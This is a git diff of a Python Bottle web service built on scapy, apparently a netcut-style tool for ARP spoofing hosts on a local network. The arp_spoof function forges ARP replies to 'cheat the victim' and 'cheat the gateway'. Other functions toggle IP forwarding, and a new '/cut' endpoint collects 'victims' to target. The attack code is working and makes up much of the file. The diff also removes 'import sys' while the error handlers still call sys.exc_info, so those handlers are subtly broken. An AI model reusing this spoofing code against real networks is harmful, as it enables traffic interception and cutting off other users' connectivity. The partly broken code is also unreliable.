@@ -1,11 +1,15 @@
-import sys
+import json
+import atexit
 import logging
 import subprocess as sp
 import netifaces
-import json
 from scapy.all import *
-from bottle import route, run, error
+from bottle import route, run
 from bottle import request, response
+
+from apscheduler.schedulers.background import BackgroundScheduler
+from apscheduler.triggers.interval import IntervalTrigger
+
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -15,6 +19,25 @@ handler.setFormatter(formatter)
 
 logger.addHandler(handler)
 
+victims = list()
+
+
+# def test_scheduler():
+#     if len(victims) > 0:
+#         print('### ', victims)
+#
+#
+# scheduler = BackgroundScheduler()
+# scheduler.start()
+# scheduler.add_job(
+#     func=test_scheduler,
+#     trigger=IntervalTrigger(seconds=5),
+#     id='printing_job',
+#     name='Print date and time every five seconds',
+#     replace_existing=True)
+#
+# # Shut down the scheduler when exiting the app
+# atexit.register(lambda: scheduler.shutdown())
 
 
 def get_hostname(ip):
@@ -27,31 +50,35 @@ def get_hostname(ip):
         if 'name = ' in line:
             return line.split(' ')[-1].strip('.\n')
 
-def enable_ip_forward(self):
+
+def enable_ip_forward():
     sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
 
-def disable_ip_forward(self):
+
+def disable_ip_forward():
     sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
 
+
 def arp_spoof(self, victim_ip, victim_hw):
-        # cheat the victim
-        pkt_1 = ARP()
-        pkt_1.op = 2
-        pkt_1.psrc = self.gwip
-        pkt_1.hwsrc = self.myhw
-        pkt_1.pdst = victim_ip
-        pkt_1.hwdst = victim_hw
+    # cheat the victim
+    pkt_1 = ARP()
+    pkt_1.op = 2
+    pkt_1.psrc = self.gwip
+    pkt_1.hwsrc = self.myhw
+    pkt_1.pdst = victim_ip
+    pkt_1.hwdst = victim_hw
 
-        # cheat the gateway
-        pkt_2 = ARP()
-        pkt_2.op = 2
-        pkt_2.psrc = victim_ip
-        pkt_2.hwsrc = self.myhw
-        pkt_2.pdst = self.gwip
-        pkt_2.hwdst = self.gwhw
+    # cheat the gateway
+    pkt_2 = ARP()
+    pkt_2.op = 2
+    pkt_2.psrc = victim_ip
+    pkt_2.hwsrc = self.myhw
+    pkt_2.pdst = self.gwip
+    pkt_2.hwdst = self.gwhw
 
-        send(pkt_1, count=3)
-        send(pkt_2, count=3)
+    send(pkt_1, count=3)
+    send(pkt_2, count=3)
+
 
 def arp_unspoof(self, victim_ip, victim_hw):
     # Correct  the victim arp table
@@ -75,7 +102,7 @@ def arp_unspoof(self, victim_ip, victim_hw):
 
 
 @route('/status')
-def get_ifaces():
+def server_status():
     """
     check if server is running
     """
@@ -225,14 +252,28 @@ def disable_protection():
             'status': 'success',
             'msg': 'Protection Disabled'
         })
+
     except Exception as e:
         logger.error(sys.exc_info()[1], exc_info=True)
         return json.dumps({
             'status': 'error',
             'msg': sys.exc_info()[1]
         })
-    
 
+
+@route('/cut', method='POST')
+def add_to_victims():
+    response.headers['Content-Type'] = 'application/json'
+
+    new_victim = request.json
+    print(new_victim)
+    if not new_victim in victims:
+        victims.append(new_victim)
+
+    return json.dumps({
+        'status': 'success',
+        'msg': 'new victim add'
+    })
 
 
 if __name__ == '__main__':
